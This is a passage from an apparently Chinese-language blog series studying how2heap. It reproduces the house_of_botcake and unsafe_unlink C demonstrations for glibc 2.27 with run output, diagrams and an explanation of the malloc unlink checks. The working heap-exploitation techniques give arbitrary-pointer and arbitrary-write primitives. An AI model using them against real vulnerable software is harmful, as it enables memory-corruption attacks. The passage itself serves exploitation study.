class="line">0x7fffffffdc68: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7fffffffdc70: 0x55555555b490</span><br><span class="line">0x7fffffffdc78: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7fffffffdc80: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7fffffffdc88: 0xcdcdcdcdcdcdcdcd</span><br><span class="line"></span><br><span class="line">Finally, if we malloc one more time then we get the stack address back: 0x7fffffffdc70</span><br></pre></td></tr></tbody></table></figure>

<h3 id="house-of-botcake-double-free"><a href="#house-of-botcake-double-free" class="headerlink" title="house_of_botcake(double free)"></a>house_of_botcake(double free)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"This file demonstrates a powerful tcache poisoning attack by tricking malloc into"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"returning a pointer to an arbitrary location (in this demo, the stack)."</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"This attack only relies on double free.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"The address we want malloc() to return, namely,"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"the target address is %p.\n\n"</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Preparing heap layout"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later."</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++){</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating a chunk for later consolidation"</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating the victim chunk."</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc(0x100): a=%p.\n"</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating a padding to prevent consolidation.\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Now we are able to cause chunk overlapping"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 1: fill up tcache list"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++){</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 2: free the victim chunk so it will be added to unsorted bin"</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 3: free the previous chunk and make it consolidate with the victim chunk."</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// simple tcache poisoning</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Launch tcache poisoning"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk"</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"We simply overwrite victim's fwd pointer"</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="type">long</span>)stack_var;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Now we can cash out the target chunk."</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The new chunk is at %p\n"</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Got control on target/stack!\n\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// note</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Note:"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"In that case, once you have done this exploitation, you can have many arbitary writes very easily."</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>此攻击手法适用于仅有double free漏洞。</p>
<p>我们在栈上创建一个变量，此变量做为最后malloc的地址。创建七个堆块，prev堆块，a堆块。最后再分配一个0x10为了防止与top_chunk合并。</p>
<p>现在利用七个堆块将对应的tcache填满，并将a先放入unsortedbin，再将prev放入unsorted bin。这样可以使得prev和a进行合并。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/7.png"></p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/8.png"></p>
<p>为了将a放入tcache bins中，所以我们需要先将tcachebins -1，再free掉a，现在a不仅仅在tcache bins中还在unsortedbin中。形成了一个堆块重叠</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/9.png"></p>
<p>申请一个比prev要大的size，这样申请会从unsorted bin中取，取到a。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/10.png"></p>
<p>利用0x131这个堆块将a的fd改成stack_var，这样子的话tcache bins也会被改掉</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/11.png"></p>
<p>申请两次chunk就可以申请到stack_var这个目标地址了。</p>
<p>运行结果：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates a powerful tcache poisoning attack by tricking malloc into</span><br><span class="line">returning a pointer to an arbitrary location (in this demo, the stack).</span><br><span class="line">This attack only relies on double free.</span><br><span class="line"></span><br><span class="line">The address we want malloc() to return, namely,</span><br><span class="line">the target address is 0x7fffffffdce0.</span><br><span class="line"></span><br><span class="line">Preparing heap layout</span><br><span class="line">Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.</span><br><span class="line">Allocating a chunk for later consolidation</span><br><span class="line">Allocating the victim chunk.</span><br><span class="line">malloc(0x100): a=0x55555555bae0.</span><br><span class="line">Allocating a padding to prevent consolidation.</span><br><span class="line"></span><br><span class="line">Now we are able to cause chunk overlapping</span><br><span class="line">Step 1: fill up tcache list</span><br><span class="line">Step 2: free the victim chunk so it will be added to unsorted bin</span><br><span class="line">Step 3: free the previous chunk and make it consolidate with the victim chunk.</span><br><span class="line">Step 4: add the victim chunk to tcache list by taking one out from it and free victim again</span><br><span class="line"></span><br><span class="line">Launch tcache poisoning</span><br><span class="line">Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk</span><br><span class="line">We simply overwrite victim's fwd pointer</span><br><span class="line">Now we can cash out the target chunk.</span><br><span class="line">The new chunk is at 0x7fffffffdce0</span><br><span class="line">Got control on target/stack!</span><br><span class="line"></span><br><span class="line">Note:</span><br><span class="line">And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim</span><br><span class="line">In that case, once you have done this exploitation, you can have many arbitary writes very easily.</span><br></pre></td></tr></tbody></table></figure>

<p>unsafe_unlink(unlink)</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome to unsafe unlink 2.0!\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Tested in Ubuntu 18.04.4 64bit.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">//we want to be big enough not to use tcache or fastbin</span></span><br><span class="line">	<span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The global chunk0_ptr is at %p, pointing to %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The victim chunk we are going to corrupt is at %p\n\n"</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We create a fake chunk inside chunk0.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Fake chunk fd: %p\n"</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Fake chunk bk: %p\n\n"</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n"</span>);</span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n"</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n"</span>,(<span class="type">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n"</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n"</span>);</span><br><span class="line">	<span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Original value: %s\n"</span>,victim_string);</span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"New Value: %s\n"</span>,victim_string);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// sanity check</span></span><br><span class="line">	assert(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>创建两个释放可以直接进unsortedbin大小的chunk。接着在chunk0_ptr里伪造chunk，为什么需要伪造chunk？看下面的源码</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) {                                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);                \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;                               \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;                               \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))           \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">"corrupted double-linked list"</span>);                \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> {                            \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;                           \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;                           \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))              \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {          \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)       \</span></span><br><span class="line"><span class="meta">      || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">         malloc_printerr (<span class="string">"corrupted double-linked list (not small)"</span>);   \</span></span><br><span class="line"><span class="meta">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) {                \</span></span><br><span class="line"><span class="meta">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                  \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;           \</span></span><br><span class="line"><span class="meta">                <span class="keyword">else</span> {                         \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;              \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;              \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;              \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;              \</span></span><br><span class="line"><span class="meta">                  }                            \</span></span><br><span class="line"><span class="meta">              } <span class="keyword">else</span> {                         \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;           \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;           \</span></span><br><span class="line"><span class="meta">              }                               \</span></span><br><span class="line"><span class="meta">          }                               \</span></span><br><span class="line"><span class="meta">      }                                  \</span></span><br><span class="line"><span class="meta">}</span></span><br></pre></td></tr></tbody></table></figure>

<p>我们最后想要达到的结果就是<code>FD-&gt;bk = BK; BK-&gt;fd = FD;  </code>那我们肯定需要绕过前面的if判断，FD-&gt;bk != P || BK-&gt;fd != P。所以我们需要伪造chunk使得<code>p-&gt;fd-&gt;bk = p&amp;&amp;p-&gt;bk-&gt;fd=p</code></p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/12.png"></p>
<p>如上图，可以绕过那个if。接下来假设chunk0有个漏洞，可以改chunk1的数据。将chunk1的prev_size改成0x420，将chunk1的inuse位改成0，然后释放chunk1，就会有一个unlink操作。这个时候chunk0就已经被改成了8050这里了<code>chunk0_ptr[3] = (uint64_t) victim_string</code>这个修改的就是粉色框的数据。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/13.png"></p>
<p>因为又将chunk0的地址改成了dc80这里，所以下一次填充数据的时候就会填到dc80。</p>
<p>运行结果</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Welcome to unsafe unlink 2.0!</span><br><span class="line">Tested in Ubuntu 18.04.4 64bit.</span><br><span class="line">This technique can be used when you have a pointer at a known location to a region you can call unlink on.</span><br><span class="line">The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.</span><br><span class="line">The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.</span><br><span class="line"></span><br><span class="line">The global chunk0_ptr is at 0x555555558068, pointing to 0x55555555b260</span><br><span class="line">The victim chunk we are going to corrupt is at 0x55555555b690</span><br><span class="line"></span><br><span class="line">We create a fake chunk inside chunk0.</span><br><span class="line">We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.</span><br><span class="line">We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.</span><br><span class="line">With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</span><br><span class="line">Fake chunk fd: 0x555555558050</span><br><span class="line">Fake chunk bk: 0x555555558058</span><br><span class="line"></span><br><span class="line">We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.</span><br><span class="line">We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.</span><br><span class="line">It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly</span><br><span class="line">If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x420</span><br><span class="line">We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.</span><br><span class="line"></span><br><span class="line">Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.</span><br><span class="line">You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344</span><br><span class="line"></span><br><span class="line">At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.</span><br><span class="line">chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.</span><br><span class="line">Original value: Hello!~</span><br><span class="line">New Value: BBBBAAAA��UUUU</span><br></pre></td></tr></tbody></table></figure>

